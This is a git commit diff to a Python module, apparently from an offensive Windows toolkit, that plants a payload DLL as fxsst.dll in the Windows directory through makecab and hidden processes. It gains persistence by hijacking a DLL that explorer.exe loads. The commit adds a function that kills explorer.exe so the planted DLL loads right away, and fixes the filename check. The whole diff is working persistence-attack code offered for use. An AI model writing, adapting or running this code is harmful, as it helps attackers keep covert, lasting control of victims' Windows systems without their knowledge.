942ba26dac88aee7874d084ca3b5ffb820a18d55
rootm0s <rickardmalmkvist@hotmail.com>
2018-06-07 14:45:20 +0200

    Update dll_fax.py

--- functions/todo/dll_fax.py
+++ functions/todo/dll_fax.py
@@ -1,7 +1,3 @@
-"""
-Works from: Windows XP
-Fixed in: Windows 8
-"""
 import os
 import wmi
 import time
@@ -11,8 +7,26 @@ from core.prints import *
 wmi = wmi.WMI()
 
 def windows_directory():
-	for os in wmi.Win32_OperatingSystem():
-		return os.WindowsDirectory
+	"""
+	Get system directory
+	"""
+	try:
+		for os in wmi.Win32_OperatingSystem():
+			return os.WindowsDirectory
+	except Exception as error:
+		return False
+		
+def restart_explorer():
+	"""
+	Once the DLL is dropped we can either wait for a reboot
+	or just kill the process and start it again
+	"""
+	try:
+		for process in wmi.Win32_Process():
+			if (process.Caption == "explorer.exe"):
+				process.Terminate(process.ParentProcessId)
+	except Exception as error:
+		return False
 
 def fax_dll(payload):
 	print """
@@ -25,6 +39,7 @@ def fax_dll(payload):
  When everything worked correctly, we should gain persistence
  -------------------------------------------------------------
  """
+ 
 	"""
 	Save the DLL file to temp directory
 	"""
@@ -56,7 +71,7 @@ def fax_dll(payload):
 	the DLL drop
 	"""
 	print_info("Attempting to create cabinet file")
-	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True):
+	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"fxsst.dll")) == True):
 		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"fxsst.dll"),
 							os.path.join(tempfile.gettempdir(),"suspicious.cab")),
 							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
@@ -68,7 +83,6 @@ def fax_dll(payload):
 			try:
 				os.remove(os.path.join(tempfile.gettempdir(),"fxsst.dll"))
 			except Exception as error:
-				print_error("Unable to create cabinet file")
 				return False
 		else:
 			print_error("Unable to create cabinet file")
@@ -97,7 +111,6 @@ def fax_dll(payload):
 			try:
 				os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))
 			except Exception as error:
-				print_error("Unable to extract cabinet file")
 				return False
 		else:
 			print_error("Unable to extract cabinet file")
@@ -105,3 +118,14 @@ def fax_dll(payload):
 	else:
 		print_error("Unable to extract cabinet file, the cabinet file is not present in: {}".format(tempfile.gettempdir()))
 		return False
+		
+	"""	
+	Check if our DLL file is present in the Windows directory
+	"""
+	if (os.path.isfile(os.path.join(windows_directory(),"fxsst.dll")) == True):
+		if (restart_explorer() == None):
+			print_success("We should now have persistence on system")
+		else:
+			print_error("Unable to restart explorer process, we get persistence once the system reboots")
+	else:
+		print_error("Unable to get persistence on system, file copy failed")
